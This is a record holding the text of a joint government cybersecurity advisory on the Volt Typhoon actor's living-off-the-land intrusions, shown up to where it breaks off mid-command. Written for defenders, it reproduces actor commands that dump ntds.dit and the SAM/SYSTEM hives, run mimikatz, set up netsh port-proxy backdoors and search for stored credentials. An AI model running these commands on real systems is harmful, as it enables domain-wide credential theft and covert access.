{
    "id": "ede3fe77-d250-420b-a468-b7e68ef994d7",
    "created_at": "2023-09-19T02:07:10.144553Z",
    "updated_at": "2025-03-27T02:16:14.475391Z",
    "deleted_at": null,
    "sha1_hash": "012ddc65bd916989f9731cecde0dad4ca881e95d",
    "title": "",
    "authors": "",
    "file_creation_date": "2023-06-01T11:56:10Z",
    "file_modification_date": "2023-06-01T11:56:10Z",
    "file_size": 740764,
    "plain_text": "**TLP:CLEAR**\n\n# People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection\n\n## Summary\n\nThe United States and international cybersecurity authorities are issuing this joint\nCybersecurity Advisory (CSA) to highlight a recently discovered cluster of activity of\ninterest associated with a People’s Republic of China (PRC) state-sponsored cyber\n[actor, also known as Volt Typhoon. Private sector partners have identified that this](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)\nactivity affects networks across U.S. critical infrastructure sectors, and the authoring\nagencies believe the actor could apply the same techniques against these and other\nsectors worldwide.\n\nThis advisory from the United States National Security Agency (NSA), the U.S.\nCybersecurity and Infrastructure Security Agency (CISA), the U.S. Federal Bureau of\nInvestigation (FBI), the Australian Signals Directorate’s Australian Cyber Security\nCentre (ACSC), the Communications Security Establishment’s Canadian Centre for\nCyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC-NZ),\nand the United Kingdom National Cyber Security Centre (NCSC-UK) (hereafter referred\nto as the “authoring agencies”) provides an overview of hunting guidance and\nassociated best practices to detect this activity.\n\nOne of the actor’s primary tactics, techniques, and procedures (TTPs) is living off the\nland, which uses built-in network administration tools to perform their objectives. This\nTTP allows the actor to evade detection by blending in with normal Windows system\nand network activities, avoid endpoint detection and response (EDR) products that\nwould alert on the introduction of third-party applications to the host, and limit the\namount of activity that is captured in default logging configurations. Some of the built-in\ntools this actor uses are: wmic, ntdsutil, netsh, and PowerShell. The advisory\n\n**Disclaimer: This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or no foreseeable**\nrisk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:CLEAR information may be\n\n\n-----\n\n**TLP:CLEAR**\n\n\nprovides examples of the actor’s commands along with detection signatures to aid\nnetwork defenders in hunting for this activity. Many of the behavioral indicators included\ncan also be legitimate system administration commands that appear in benign activity.\nCare should be taken not to assume that findings are malicious without further\ninvestigation or other indications of compromise.\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\n### Contents\n\nPeople's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade\nDetection ......................................................................................................................... 1\nSummary ......................................................................................................................... 1\nTechnical Details ............................................................................................................. 4\nBackground ..................................................................................................................... 4\nArtifacts ........................................................................................................................... 4\n\nNetwork artifacts .......................................................................................................... 4\n\nHost artifacts ................................................................................................................ 5\n\nWindows management instrumentation (WMI/WMIC) .............................................. 5\n\nNtds.dit Active Directory database ........................................................................... 5\n\nPortProxy ................................................................................................................. 8\n\nPowerShell ............................................................................................................. 10\n\nImpacket ................................................................................................................ 10\n\nEnumeration of the environment ............................................................................ 11\n\nAdditional credential theft ....................................................................................... 12\n\nAdditional commands ............................................................................................. 12\n\nMitigations ..................................................................................................................... 13\n\nLogging recommendations ........................................................................................ 14\n\nIndicators of compromise (IOCs) summary ................................................................... 15\n\nTTPs .......................................................................................................................... 15\n\nCommand execution .................................................................................................. 16\n\nCommand line patterns .............................................................................................. 18\n\nFile paths ................................................................................................................... 18\n\nFile names ................................................................................................................. 18\n\nSHA-256 file hashes .................................................................................................. 18\n\nUser-agent ................................................................................................................. 19\n\nYara rules .................................................................................................................. 19\n\nReferences .................................................................................................................... 21\nAcknowledgements ....................................................................................................... 22\nAppendix: MITRE ATT&CK Techniques ........................................................................ 23\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\n## Technical Details\n\nThis advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the\n_Appendix: MITRE ATT&CK Techniques for all referenced tactics and techniques._\n\n## Background\n\nThe authoring agencies are aware of recent People’s Republic of China (PRC) statesponsored cyber activity and have identified potential indicators associated with these\ntechniques. This advisory will help net defenders hunt for this activity on their systems.\nIt provides many network and host artifacts associated with the activity occurring after\nthe network has been initially compromised, with a focus on command lines used by the\ncyber actor. An Indicators of compromise (IOCs) summary is included at the end of this\n\nadvisory. For a downloadable copy of IOCs, see aa23-144a.stix_.xml (STIX, 35 kB).\n\nEspecially for living off the land techniques, it is possible that some command lines\nmight appear on a system as the result of benign activity and would be false positive\nindicators of malicious activity. Defenders must evaluate matches to determine their\nsignificance, applying their knowledge of the system and baseline behavior.\nAdditionally, if creating detection logic based on these commands, network defenders\n\nshould account for variability in command string arguments, as items such as ports\nused may differ across environments.\n\n## Artifacts\n\n#### Network artifacts\nThe actor has leveraged compromised small office/home office (SOHO) network\ndevices as intermediate infrastructure to obscure their activity by having much of the\ncommand and control (C2) traffic emanate from local ISPs in the geographic area of the\nvictim. Owners of SOHO devices should ensure that network management interfaces\nare not exposed to the Internet to avoid them being re-purposed as redirectors by\nmalicious actors. If they must be exposed to the Internet, device owners and operators\nshould ensure they follow zero trust principles and maintain the highest level of\nauthentication and access controls possible.\n\nThe actor has used Earthworm and a custom Fast Reverse Proxy (FRP) client with\n[hardcoded C2 callbacks [T1090] to ports 8080, 8443, 8043, 8000, and 10443 with](https://attack.mitre.org/versions/v13/techniques/T1090/)\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\nvarious filenames including, but not limited to: cisco_up.exe, cl64.exe, vm3dservice.exe,\nwatchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe.\n\n#### Host artifacts\n\n###### Windows management instrumentation (WMI/WMIC)\nThe actor has executed the following command to gather information about local drives\n\n[T1082]:\n```\n  cmd.exe /C \"wmic path win32_logicaldisk get\n  caption,filesystem,freespace,size,volumename\"\n\n```\nThis command does not require administrative credentials to return results. The\n[command uses a command prompt [T1059.003] to execute a Windows Management](https://attack.mitre.org/versions/v13/techniques/T1059/003/)\nInstrumentation Command Line (WMIC) query, collecting information about the storage\ndevices on the local host, including drive letter, file system (e.g., new technology file\nsystem [NTFS]), free space and drive size in bytes, and an optional volume name.\nWindows Management Instrumentation (WMI) is a built-in Windows tool that allows a\nuser to access management information from hosts in an enterprise environment. The\ncommand line version of WMI is called WMIC.\n\nBy default, WMI Tracing is not enabled, so the WMI commands being executed and the\nassociated user might not be available. Additional information on WMI events and\ntracing can be found in the References section of the advisory.\n\n###### Ntds.dit Active Directory database\nThe actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from\nWindows domain controllers (DCs) out of the network to perform password cracking\n\n[[T1003.003]. (The ntds.dit file is the main Active Directory (AD) database file and, by](https://attack.mitre.org/versions/v13/techniques/T1003/003/)\ndefault, is stored at %SystemRoot%\\NTDS\\ntds.dit. This file contains information\n\nabout users, groups, group memberships, and password hashes for all users in the\ndomain; the SYSTEM registry hive contains the boot key that is used to encrypt\ninformation in the ntds.dit file.) Although the ntds.dit file is locked while in use by AD, a\ncopy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file\nfrom the Shadow Copy. The SYSTEM registry hive may also be obtained from the\nShadow Copy. The following example commands show the actor creating a Shadow\nCopy and then extracting a copy of the ntds.dit file from it.\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\n   cmd /c vssadmin create shadow /for=C: >\n   C:\\Windows\\Temp\\<filename>.tmp\n   cmd /c copy\n   \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTD\n   S\\ntds.dit C:\\Windows\\Temp > C:\\Windows\\Temp\\<filename>.tmp\n\n```\nThe built-in Ntdsutil.exe tool performs all these actions using a single command. There\nare several ways to execute Ntdsutil.exe, including running from an elevated command\nprompt (cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the\nexecution of Ntdsutil.exe commands using long, short, or a combination of the\n\nnotations. For example, the long notation command activate instance ntds ifm\ncan also be executed using the short notation ac i ntds i. Table 1 provides the long\nand short forms of the arguments used in the sample Ntdsutil.exe command, along with\na brief description of the arguments.\n\n**_Table 1: Ntdsutil.exe command syntax_**\n\n**Long form** **Short form** **Description**\n\nSets variable % as the active instance for\nactivate instance % ac i %\nntdsutil to use\n\nInstall from media (ifm). Creates\ninstallation media to be used with\n\nifm i DCPromo so the server will not need to\n\ncopy data from another Domain\nController on the network\n\n[The actor has executed WMIC commands [T1047] to create a copy of the ntds.dit file](https://attack.mitre.org/versions/v13/techniques/T1047/)\nand SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is\na standalone example; multiple examples are provided to show how syntax and file\npaths may differ per environment.\n```\n   wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create\n   full C:\\Windows\\Temp\\pro\n   wmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds\\\"\n   ifm \\\"create full C:\\Windows\\Temp\\Pro\"\n   wmic process call create \"cmd.exe /c mkdir\n   C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create\n   full C:\\Windows\\Temp\\tmp\\\"\n   \"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir\n   C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm\n   \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"\n\n```\n|Long form|Short form|Description|\n|---|---|---|\n|activate instance %|ac i %|Sets variable % as the active instance for ntdsutil to use|\n|ifm|i|Install from media (ifm). Creates installation media to be used with DCPromo so the server will not need to copy data from another Domain Controller on the network|\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\n   cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir\n   C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create\n   full C:\\Windows\\Temp\\tmp\\\" 1>\n   \\\\127.0.0.1\\ADMIN$\\<timestamp value> 2>&1\n\n```\n**Note: The <timestamp value> would be an epoch timestamp following the format**\n\nlike “__1684956600.123456”.\n\nEach actor command above creates a copy of the ntds.dit database and the SYSTEM\nand SECURITY registry hives in the C:\\Windows\\Temp\\<folder> directory, where\n```\n<folder> is replaced with the path specified in the command (e.g., pro, tmp, or\n\n```\nMcAfee_Logs). By default, the hidden ADMIN$ share is mapped to C:\\Windows\\, so\nthe last command will direct standard output and error messages from the command to\na file within the folder specified.\n\nThe actor has also saved the files directly to the C:\\Windows\\Temp and\n```\nC:\\Users\\Public directories, so the entirety of those directory structures should be\n\n```\nanalyzed. Ntdsutil.exe creates two subfolders in the directory specified in the command:\nan Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry\nfolder that contains the SYSTEM and SECURITY hives. Defenders should look for this\nfolder structure across their network:\n```\n   <path specified in command>\\Active Directory\\ntds.dit\n   <path specified in command>\\Active Directory\\ntds.jfm\n   <path specified in command>\\registry\\SECURITY\n   <path specified in command>\\registry\\SYSTEM\n\n```\nWhen one of the example commands is executed, several successive log entries are\ncreated in the Application log, under the ESENT Source. Associated events can be\n\nviewed in Windows Event Viewer by navigating to: Windows Logs | Application. To\n\nnarrow results to relevant events, select Filter Current Log from the Actions menu on\nthe right side of the screen. In the Event sources dropdown, check the box next to\nESENT, then limit the logs to ID numbers 216, 325, 326, and 327. Clicking the OK box\n\nwill apply the filters to the results.\n\nSince ESENT logging is used extensively throughout Windows, defenders should focus\non events that reference ntds.dit. If such events are present, the events’ details should\ncontain the file path where the file copies were created. Since these files can be\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\ndeleted, or enhanced logging may not be configured on hosts, the file path can greatly\naid in a hunt operation. Identifying the user associated with this activity is also a critical\nstep in a hunt operation as other actions by the compromised—or actor-created—user\naccount can be helpful to understand additional actor TTPs, as well as the breadth of\nthe actor's actions.\n\n**Note: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain**\n\nshould be considered compromised, as the actor will generally be able to crack the\npassword hashes for domain user accounts, create their own accounts, and/or join\n\nunauthorized systems to the domain. If this occurs, defenders should follow guidance\nfor removing malicious actors from victim networks, such as CISA's [Eviction Guidance](https://www.cisa.gov/news-events/analysis-reports/ar21-134a)\n[for Network Affected by the SolarWinds and Active Directory/M365 Compromise.](https://www.cisa.gov/news-events/analysis-reports/ar21-134a)\n\nIn addition to the above TTPs used by the actor to copy the ntds.dit file, the following\ntools could be used by an actor to obtain the same information:\n\n  - Secretsdump.py\n\n     - **_Note: This script is a component of Impacket, which the actor has been_**\n\n_known to use_\n\n  - Invoke-NinjaCopy (PowerShell)\n\n  - DSInternals (PowerShell)\n\n  - FgDump\n\n  - Metasploit\n\nBest practices for securing ntds.dit include hardening Domain Controllers and\nmonitoring event logs for ntdsutil.exe and similar process creations. Additionally, any\nuse of administrator privileges should be audited and validated to confirm the legitimacy\nof executed commands.\n\n###### PortProxy\n[The actor has used the following commands to enable port forwarding [T1090] on the](https://attack.mitre.org/versions/v13/techniques/T1090/)\n\nhost:\n```\n   \"cmd.exe /c \"netsh interface portproxy add v4tov4\n   listenaddress=0.0.0.0 listenport=9999\n   connectaddress=<rfc1918 internal ip address>\n   connectport=8443 protocol=tcp\"\"\n\n```\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\n   \"cmd.exe /c netsh interface portproxy add v4tov4\n   listenport=50100 listenaddress=0.0.0.0 connectport=1433\n   connectaddress=<rfc1918 internal ip address>\"\n\n```\nwhere <rfc1918 internal ip address> is replaced with an IPv4 address\ninternal to the network, omitting the < >’s.\n\nNetsh is a built-in Windows command line scripting utility that can display or modify the\nnetwork settings of a host, including the Windows Firewall. The portproxy add command\nis used to create a host:port proxy that will forward incoming connections on the\n\nprovided listenaddress and listenport to the connectaddress and connectport.\nAdministrative privileges are required to execute the portproxy command. Each\nportproxy command above will create a registry key in the\n```\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\ path.\n\n```\nDefenders should look for the presences of keys in this path and investigate any\nanomalous entries.\n\n**Note: Using port proxies is not common for legitimate system administration since they**\n\ncan constitute a backdoor into the network that bypasses firewall policies.\nAdministrators should limit port proxy usage within environments and only enable them\n\nfor the period of time in which they are required.\n\nDefenders should also use unusual IP addresses and ports in the command lines or\nregistry entries to identify other hosts that are potentially included in actor actions. All\nhosts on the network should be examined for new and unusual firewall and port\n\nforwarding rules, as well as IP addresses and ports specified by the actor. If network\ntraffic or logging is available, defenders should attempt to identify what traffic was\nforwarded though the port proxies to aid in the hunt operation. As previously mentioned,\nidentifying the associated user account that made the networking changes can also aid\n\nin the hunt operation.\n\nFirewall rule additions and changes can be viewed in Windows Event Viewer by\n\nnavigating to: Applications and Service Logs | Microsoft | Windows |\n```\nWindows Firewall With Advanced Security | Firewall.\n\n```\nIn addition to host-level changes, defenders should review perimeter firewall\nconfigurations for unauthorized changes and/or entries that may permit external\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\nconnections to internal hosts. The actor is known to target perimeter devices in their\noperations. Firewall logs should be reviewed for any connections to systems on the\nports listed in any portproxy commands discovered.\n\n###### PowerShell\n[The actor has used the following PowerShell [T1059.001] command to identify](https://attack.mitre.org/versions/v13/techniques/T1059/001/)\nsuccessful logons to the host [T1033]:\n```\n   Get-EventLog security -instanceid 4624 \n\n```\n**Note: Event ID 4624 is logged when a user successfully logs on to a host and**\ncontains useful information such as the logon type (e.g., interactive or\nnetworking), associated user and computer account names, and the logon time.\nEvent ID 4624 entries can be viewed in Windows Event Viewer by navigating to:\n```\n   Windows Logs | Security. PowerShell logs can be viewed in Event Viewer:\n   Applications and Service Logs | Windows PowerShell.\n\n```\nThis command identifies what user account they are currently leveraging to access the\nnetwork, identify other users logged on to the host, or identify how their actions are\n[being logged. If the actor is using a password spray technique [T1110.003], there may](https://attack.mitre.org/versions/v13/techniques/T1110/003/)\n\nbe several failed logon (Event ID 4625) events for several different user accounts,\nfollowed by one or more successful logons (Event ID 4624) within a short period of time.\nThis period may vary by actor but can range from a few seconds to a few minutes.\n\n[If the actor is using brute force password attempts [T1110] against a single user](https://attack.mitre.org/versions/v13/techniques/T1110/)\naccount, there may be several Event ID 4625 entries for that account, followed by a\nsuccessful logon Event ID 4624. Defenders should also look for abnormal account\nactivity, such as logons outside of normal working hours and impossible time-anddistance logons (e.g., a user logging on from two geographically separated locations at\nthe same time).\n\n###### Impacket\nThe actor regularly employs the use of Impacket’s wmiexec, which redirects output to a\nfile within the victim host’s ADMIN$ share (C:\\Windows\\) containing an epoch\ntimestamp in its name. The following is an example of the “dir” command being\nexecuted by wmiexec.py:\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\n   cmd.exe /Q /c dir 1> \n   \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2>&1\n\n```\n**Note: Discovery of an entry similar to the example above in the Windows Event**\n\nLog and/or a file with a name in a similar format may be evidence of malicious\nactivity and should be investigated further. In the event that only a filename is\ndiscovered, the epoch timestamp within the filename reflects the time of\nexecution by default and can be used to help scope threat hunting activities.\n\n###### Enumeration of the environment\nThe following commands were used by the actor to enumerate the network topology\n\n[[T1016], the active directory structure [T1069.002], and other information about the](https://attack.mitre.org/versions/v13/techniques/T1016/)\ntarget environment [T1069.001], [T1082]:\n```\n   arp -a\n   curl www.ip-api.com\n   dnscmd . /enumrecords /zone {REDACTED}\n   dnscmd . /enumzones\n   dnscmd /enumrecords {REDACTED} . /additional\n   ipconfig /all\n   ldifde.exe -f c:\\windows\\temp\\<filename>.txt -p subtree \n   net localgroup administrators\n   net group /dom\n   net group \"Domain Admins\" /dom\n   netsh interface firewall show all\n   netsh interface portproxy show all\n   netsh interface portproxy show v4tov4\n   netsh firewall show all\n   netsh portproxy show v4tov4\n   netstat -ano\n   reg query hklm\\software\\\n   systeminfo\n   tasklist /v\n   whoami\n   wmic volume list brief\n   wmic service brief\n\n```\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\n   wmic product list brief\n   wmic baseboard list full\n   wevtutil qe security /rd:true /f:text\n    /q:*[System[(EventID=4624) and\n    TimeCreated[@SystemTime>='{REDACTED}']] and\n    EventData[Data='{REDACTED}']]\n\n###### Additional credential theft\n```\nThe actor also used the following commands to identify additional opportunities for\nobtaining credentials in the environment [T1555], [T1003]:\n```\n   dir C:\\Users\\{REDACTED}\\.ssh\\known_hosts\n   dir\n   C:\\users\\{REDACTED}\\appdata\\roaming\\Mozilla\\firefox\\profile\n   s\n   mimikatz.exe\n   reg query hklm\\software\\OpenSSH\n   reg query hklm\\software\\OpenSSH\\Agent\n   reg query hklm\\software\\realvnc\n   reg query hklm\\software\\realvnc\\vncserver\n   reg query hklm\\software\\realvnc\\Allusers\n   reg query hklm\\software\\realvnc\\Allusers\\vncserver\n   reg query hkcu\\software\\{REDACTED}\\putty\\session\n   reg save hklm\\sam ss.dat\n   reg save hklm\\system sy.dat\n\n###### Additional commands\n```\nThe actor executed the following additional commands:\n```\n   7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z \n   C:\\Windows\\system32\\pcwrun.exe\n   C:\\Users\\Administrator\\Desktop\\Win.exe\n   C:\\Windows\\System32\\cmdbak.exe /c ping -n 1 127.0.0.1 > \n   C:\\Windows\\temp\\putty.log \n   C:\\Windows\\Temp\\tmp.log\n   \"cmd.exe\" /c dir \\\\127.0.0.1\\C$ /od\n   \"cmd.exe\" /c ping –a –n 1 <IP address>\n   \"cmd.exe\" /c wmic /user:<username> /password:<password>\n   process call create \"net stop \\\"<service name>\\\" >\n   C:\\Windows\\Temp\\tmp.log\"\n\n```\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\n   cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value>\n   2>&1\n   net use \\\\127.0.0.1\\IPC$ /y /d\n   powershell start-process -filepath\n   c:\\windows\\temp\\<filename>.bat -windowstyle Hidden\n   rar.exe a –{REDACTED} c:\\Windows\\temp\\{REDACTED}\n   D:\\{REDACTED}\\\n   wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED}\n   cmd /c whoami\n   xcopy C:\\windows\\temp\\hp d:\\{REDACTED}\n\n## Mitigations\n\n```\nThe authoring agencies recommend organizations implement the mitigations below to\nimprove your organization’s cybersecurity posture on the basis of the threat actor’s\nactivity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals\n(CPGs) developed by CISA and the National Institute of Standards and Technology\n(NIST). The CPGs provide a minimum set of practices and protections that CISA and\nNIST recommend all organizations implement. CISA and NIST based the CPGs on\nexisting cybersecurity Frameworks and guidance to protect against the most common\n[and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance](https://www.cisa.gov/cpg)\n[Goals](https://www.cisa.gov/cpg) for more information on the CPGs, including additional recommended baseline\nprotections.\n\n[ Defenders should harden domain controllers and monitor event logs [2.T] for](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)\n\nntdsutil.exe and similar process creations. Additionally, any use of administrator\nprivileges should be audited and validated to confirm the legitimacy of executed\ncommands.\n\n  - Administrators should limit port proxy usage within environments and only enable\n\nthem for the period of time in which they are required [2.X].\n\n  - Defenders should investigate unusual IP addresses and ports in command lines,\n\nregistry entries, and firewall logs to identify other hosts that are potentially\ninvolved in actor actions.\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\n\n  - In addition to host-level changes, defenders should review perimeter firewall\n\nconfigurations for unauthorized changes and/or entries that may permit external\nconnections to internal hosts.\n\n  - Defenders should also look for abnormal account activity, such as logons outside\n\nof normal working hours and impossible time-and-distance logons (e.g., a user\nlogging on from two geographically separated locations at the same time).\n\n  - Defenders should forward log files to a hardened centralized logging server,\n\npreferably on a segmented network [2.F].\n\n#### Logging recommendations \nTo be able to detect the activity described in this CSA, defenders should set the audit\npolicy for Windows security logs to include “audit process creation” and “include\n```\ncommand line in process creation events” in addition to accessing the logs.\n\n```\nOtherwise, the default logging configurations may not contain the necessary\ninformation.\n\nEnabling these options will create Event ID 4688 entries in the Windows Security log to\nview command line processes. Given the cost and difficulty of logging and analyzing\nthis kind of activity, if an organization must limit the requirements, they should focus on\nenabling this kind of logging on systems that are externally facing or perform\nauthentication or authorization, especially including domain controllers.\n\nTo hunt for the malicious WMI and PowerShell activity, defenders should also log WMI\nand PowerShell events. By default, WMI Tracing and deep PowerShell logging are not\nenabled, but they can be enabled by following the configuration instructions linked in the\n_References_ section.\n\n[The actor takes measures to hide their tracks, such as clearing logs [T1070.001]. To](https://attack.mitre.org/versions/v13/techniques/T1070/001/)\nensure log integrity and availability, defenders should forward log files to a hardened\ncentralized logging server, preferably on a segmented network. Such an architecture\nmakes it harder for an actor to cover their tracks as evidence of their actions will be\ncaptured in multiple locations.\n\nDefenders should also monitor logs for Event ID 1102, which is generated when the\naudit log is cleared. All Event ID 1102 entries should be investigated as logs are\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\ngenerally not cleared and this is a known actor tactic to cover their tracks. Even if an\nevent log is cleared on a host, if the logs are also stored on a logging server, the copy of\nthe log will be preserved.\n\nThis activity is often linked to malicious exploitation of edge devices and network\nmanagement devices. Defenders should enable logging on their edge devices, to\ninclude system logs, to be able to identify potential exploitation and lateral movement.\nThey should also enable network-level logging, such as sysmon, webserver,\nmiddleware, and network device logs.\n\n## Indicators of compromise (IOCs) summary\n\n#### TTPs\n\n  - [Exploiting vulnerabilities [T1190] in widely used software including, but not limited](https://attack.mitre.org/versions/v13/techniques/T1190/)\nto:\n\n     - CVE-2021-40539—ManageEngine ADSelfService Plus.\n\n [https://www.cisa.gov/uscert/ncas/alerts/aa21-259a.](https://www.cisa.gov/uscert/ncas/alerts/aa21-259a)\n\n    - CVE-2021-27860—FatPipe WARP, IPVPN, MPVPN.\n\n [https://www.ic3.gov/Media/News/2021/211117-2.pdf.](https://www.ic3.gov/Media/News/2021/211117-2.pdf)\n\n  - [Using webshells for persistence and exfiltration [T1505.003], with at least some](https://attack.mitre.org/versions/v13/techniques/T1505/003/)\nof the webshells derived from the Awen webshell.\n\n  - Using compromised Small-Office Home-Office (SOHO) devices (e.g. routers) to\n[obfuscate the source of the activity [T1090.002].](https://attack.mitre.org/versions/v13/techniques/T1090/002/)\n\n     - Most common types include ASUS, Cisco RV, Draytek Vigor, FatPipe\n\nIPVPN/MPVPN/WARP, Fortinet Fortigate, Netgear Prosafe, and Zyxel\nUSG devices.\n\n     - Common CVEs for these devices and mitigation guidance can be found in\n\n[the joint Cybersecurity Advisory, “Top CVEs Actively Exploited by](https://media.defense.gov/2022/Oct/06/2003092365/-1/-1/0/Joint_CSA_Top_CVEs_Exploited_by_PRC_cyber_actors.PDF)\n[People’s Republic of China State-Sponsored Cyber Actors.”](https://media.defense.gov/2022/Oct/06/2003092365/-1/-1/0/Joint_CSA_Top_CVEs_Exploited_by_PRC_cyber_actors.PDF)\n\n  - Using living off the land tools for discovery, lateral movement, and collection\nactivities, to include:\n\n     - certutil\n\n    - dnscmd\n\n     - ldifde\n\n    - makecab\n\n     - net user/group/use\n\n     - netsh\n\n     - nltest\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\n\n     - ntdsutil\n\n     - PowerShell\n\n     - req query/save\n\n     - systeminfo\n\n     - tasklist\n\n     - wevtutil\n\n    - wmic\n\n    - xcopy\n\n  - Selective clearing of Windows Event Logs, system logs, and other technical\n[artifacts to remove evidence of their intrusion activity [T1070].](https://attack.mitre.org/versions/v13/techniques/T1070/)\n\n  - Using open source “hacktools” tools, such as:\n\n     - Fast Reverse Proxy (frp)\n\n Probably derived from the publicly-available fatedier and\n\n_EarthWorm variants._\n\n    - Impacket\n\n To detect Impacket usage, see the joint Cybersecurity Advisory:\n\n[\"Impacket and Exfiltration Tool Used to Steal Sensitive Information](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-277a)\n[from Defense Industrial Base Organization”.](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-277a)\n\n     - Mimikatz.exe\n\n     - Remote administration tools\n\n Defenders should consult the joint Cybersecurity Advisory:\n\n[\"Protecting Against Malicious Use of Remote Monitoring and](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a)\n[Management Software\".](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a)\n\n#### Command execution\nFile names and directory paths used in these commands are only meant to serve as\nexamples. Actual names and paths may differ depending on environment and activity,\nso defenders should account for variants when performing queries.\n\n**Note: Many of the commands are derivatives of common system administration**\n\ncommands that could generate false positives when used alone without additional\nindicators.\n```\n   7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z\n   c:\\windows\\temp\\*\n   \"C:\\pstools\\psexec.exe\" \\\\{REDACTED} -s cmd /c \"cmd.exe /c\n   \"netsh interface portproxy delete v4tov4\n   listenaddress=0.0.0.0 listenport=9999\"\"\n   C:\\Windows\\system32\\pcwrun.exe\n   C:\\Users\\Administrator\\Desktop\\Win.exe\n\n```\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\ncmd.exe /C dir /S \\\\{REDACTED}\\c$\\Users\\{REDACTED} >>\nc:\\windows\\temp\\{REDACTED}.tmp\n\"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir\nC:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm\n\\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value>\n2>&1\ncmd.exe /Q /c net group \"domain admins\" /dom\n1>\\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1\ncmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir\nC:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create\nfull C:\\Windows\\Temp\\tmp\\\" 1>\n\\\\127.0.0.1\\ADMIN$\\<timestamp value> 2>&1\nD:\\{REDACTED}\\xcopy C:\\windows\\temp\\hp d:\\{REDACTED}\nGet-EventLog security -instanceid 4624\nldifde.exe -f c:\\windows\\temp\\cisco_up.txt -p subtree\nmakecab ..\\backup\\210829-020000.zip\n..\\webapps\\adssp\\html\\Lock.lic\nmove \"\\\\<redacted>\\c$\\users\\public\\Appfile\\registry\\SYSTEM\"\n..\\backup\\210829-020000.zip\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0\nlistenport=9999 connectaddress={REDACTED} connectport=8443\nprotocol=tcp\nnetsh interface portproxy delete v4tov4\nlistenaddress=0.0.0.0 listenport=9999\nRar.exe a –{REDACTED} c:\\Windows\\temp\\DMBC2C61.tmp\nstart-process -filepath c:\\windows\\temp\\<filename>.bat windowstyle hidden 1\n\n```\nNote: The batch file in question (<filename>.bat) could use any name, and no\ndiscernable pattern has been determined at this time.\n```\nwmic process call create \"cmd.exe /c mkdir\nC:\\users\\public\\Appfile & ntdsutil \\\"ac i ntds\\\" ifm\n\\\"create full C:\\users\\public\\Appfile\\\" q q\n\n```\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\n   wmic process call create \"cmd.exe /c mkdir\n   C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create\n   full C:\\Windows\\Temp\\tmp\\\"\n   wmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds\\\"\n   ifm \\\"create full 